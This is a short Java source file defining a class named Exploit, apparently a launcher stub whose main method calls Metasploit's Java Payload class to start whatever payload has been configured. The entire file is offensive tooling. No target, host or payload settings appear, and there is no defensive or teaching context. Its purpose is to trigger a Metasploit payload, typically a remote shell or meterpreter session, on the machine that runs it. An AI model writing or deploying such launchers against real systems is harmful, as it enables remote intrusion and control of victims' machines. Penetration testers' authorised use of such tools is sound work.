import metasploit.Payload;

/**
 * 
 * This class starts the metasploit payload.
 * @author mka
 *
 */
public class Exploit {
	public static void main(String[] args) {
		try {
			Payload.main(null);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
